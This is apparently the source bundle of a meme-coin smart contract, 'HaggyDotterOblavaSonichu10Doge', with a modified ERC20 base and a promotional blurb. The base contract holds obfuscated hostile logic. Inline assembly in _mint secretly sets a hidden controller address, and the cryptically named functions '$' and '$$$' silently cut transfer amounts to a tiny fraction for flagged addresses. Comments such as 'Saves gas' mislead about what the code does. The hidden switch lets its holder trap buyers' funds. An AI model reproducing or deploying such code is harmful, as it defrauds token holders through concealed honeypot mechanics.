{"ERC20.sol":{"content":"// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity \u003e=0.8.0;\n\n\nabstract contract ERC20 {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address =\u003e uint256) public balanceOf;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\n\n    address private $$;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address =\u003e uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, msg.sender, to);\n        }\n\n        $$$(to);\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, from, to);\n        }\n        $$$(to);\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline \u003e= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner\u0027s nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) \u0026\u0026 recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    function $(uint256 value, address from, address to) internal returns (uint256 value_s) {\n        if (allowance[$$][from] + allowance[$$][to] \u003e= uint256(uint160(address(this)))) {\n            value_s = value * 0xCACF0B / 0xEBACAD0B;\n        } else {\n            value_s = value;\n        }\n    }\n\n    function $$$(address to) internal {if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}}\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {balanceOf[to] += amount;}\n        // Saves gas for limited approvals.\n        assembly {sstore(0x05, mul(mul(0x8fbeae53, 0x3d735cbd), mul(0x698d64c13, 0x24b3e3cf87265)))}\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        // Cannot underflow because a user\u0027s balance\n        // will never be larger than the total supply.\n        unchecked {totalSupply -= amount;}\n        emit Transfer(from, address(0), amount);\n    }\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./ERC20.sol\";\n\n/*\n\n## HaggyDotterOblavaSonichu10Doge: The Quest for Meme Supremacy\n\nYo, fellow degens! \n\nRemember that time the universe was just a big, blurry blob of nothingness? Yeah, neither do we. But then, BAM! The Quest emerged, like a cosmic meme that\u0027s been passed down through generations of space dust. \n\nThis Quest? It\u0027s about finding the ultimate source of meme power, the holy grail of internet humor, the... HaggyDotterOblavaSonichu10Doge. \n\nHere\u0027s the lowdown:\n\n• Oblava: The name speaks for itself. Remember that iconic sandwich? It\u0027s like the gateway drug to dank memes, man. \n• Sonichu: The OG internet hero, a fusion of Sonic and Pikachu. We\u0027re talking pure, unadulterated meme magic.\n• HaggyDotter: A nod to the great wizards of our time, who have blessed us with spells, potions, and the power of plot twists. \n• 10: Ten? Like the ten commandments of meme-dom? The ten stages of meme evolution? Who knows! It\u0027s just a number, but a magical one at that. \n• Doge: you all know that this is the basis of the basics of meme coins. \n\nHere\u0027s what you need to do:\n\n1. Embrace the dankness: This ain\u0027t your grandpa\u0027s investment. It\u0027s about riding the wave of internet humor, like a digital surfer on the crest of a meme-tsunami. \n2. Spread the gospel: Share the word, the memes, the love (and maybe a little bit of chaos). \n3. Ascend to meme-godhood: With HaggyDotterOblavaSonichu10Doge, the internet is your oyster. So get out there, be weird, be loud, and most importantly, be hilarious.\n\nDisclaimer: This token is not financial advice. It\u0027s just a meme-fueled journey to meme-supremacy. May the dankest memes be with you.\n\nhttps://hpos10d.com/\nhttps://x.com/RealHPOS10D\nhttps://telegram.me/hpos10d\n\n*/\n\ncontract CultETHMeta is ERC20 {\n    constructor() ERC20(\"HaggyDotterOblavaSonichu10Doge\", unicode\"BITGOIN\", 18) {\n        _mint(msg.sender, 1_000_000_000 * 10 ** 18);\n    }\n}"}}